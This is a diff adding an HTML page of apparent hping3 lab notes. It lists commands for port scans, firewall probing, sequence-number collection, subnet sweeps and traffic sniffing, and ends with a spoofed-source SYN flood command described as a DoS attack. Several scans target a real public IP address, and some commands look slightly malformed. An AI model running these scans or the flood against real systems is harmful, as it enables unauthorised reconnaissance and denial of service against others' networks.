@@ -1,0 +1,75 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>hping3</title>
+</head><body><br/>
+<span style="font-size: 24pt"><u><b>1. ICMP ping</b></u></span><br/>
+<br/>
+<span style="font-size: 14pt">hping3 -1 142.250.70.110 </span><br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+<br/>
+<br/>
+<span style="font-size: 20pt"><u><b>2. ACK scan on port 80<br/>
+</b></u></span><br/>
+<span style="font-size: 15pt">hping3 -A 142.250.70.110 -p 80</span><br/>
+<br/>
+<img src="image 2.png" /><br/>
+<br/>
+<br/>
+<span style="font-size: 20pt"><b>3. <u>UDP scan on port 80</u></b></span><br/>
+<br/>
+<span style="font-size: 14pt">hping3 -2 142.250.70.110 -p 80</span><br/>
+<br/>
+<img src="image 3.png" /><br/>
+<br/>
+<br/>
+<span style="font-size: 13pt">It returns an ICMP port unreachable massage if it fnds the port closed and does not return a massage if the port is open </span><br/>
+<br/>
+<br/>
+<span style="font-size: 20pt"><b>4. <u>Firewalls and Timestamps</u></b></span><br/>
+<br/>
+<span style="font-size: 14pt">hping3 -S 142.250.70.110 -p 80 --tcp-timestamp</span><br/>
+<br/>
+<img src="image 4.png" /><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<b><span style="font-size: 20pt">5. <u>SYN scan on port 50-60<br/>
+</u><span style="font-size: 10pt"><br/>
+</span></span><span style="font-size: 14pt">hping3 -8 50-60 -s 142.250.70.110 -V</span><span style="font-size: 10pt"><span style="font-size: 20pt"><br/>
+</span></span><span style="font-size: 20pt"><br/>
+<img src="image 6.png" /><br/>
+<br/>
+6. <u>Collecting Initial Sequence Number</u><br/>
+<span style="font-size: 10pt"><br/>
+</span></span><span style="font-size: 14pt">hping3 -8 50-60 -s 142.250.70.110 -Q -p 139</span><span style="font-size: 20pt"><br/>
+</span><span style="font-size: 20pt"><br/>
+7. <u>FIN, PUSH and URG scan on port 80<br/>
+</u><br/>
+</span><span style="font-size: 13pt">hping3 -F -P -U 142.250.70 -p 80</span><span style="font-size: 20pt"><br/>
+</span><span style="font-size: 20pt"><br/>
+<img src="image 7.png" /><br/>
+<br/>
+</span></b><span style="font-size: 14pt">if port 80 is open, you will not receive a response. if the port is closed, hping will return an RST response.</span><span style="font-size: 20pt"><b><br/>
+</b></span><span style="font-size: 20pt"><b><br/>
+8. <u>Scan entire subnet for live host</u><br/>
+<br/>
+</b></span><b><span style="font-size: 13pt">hping3 -1 192.168.0.x --rand-dest -I eth0</span><span style="font-size: 20pt"><br/>
+</span><span style="font-size: 20pt"><br/>
+9. <u>Intercept all traffic containing HTTP signature<br/>
+</u><br/>
+</span><span style="font-size: 15pt">hping3 -9 HTTP -I eth0<br/>
+</span><span style="font-size: 20pt"><br/>
+10. <u>SYN flooding a victim <br/>
+</u></span></b><br/>
+<b><span style="font-size: 15pt">hping3 -S 192.168.13.147 -a 192.168.0.104 -p 22 --flood</span></b><br/>
+<br/>
+<img src="image 5.png" /><br/>
+<br/>
+<span style="font-size: 13pt">The attacker employs TCP SYN flooding techniques using spoofed IP addresses to perform a DOS attack.</span></body></html>
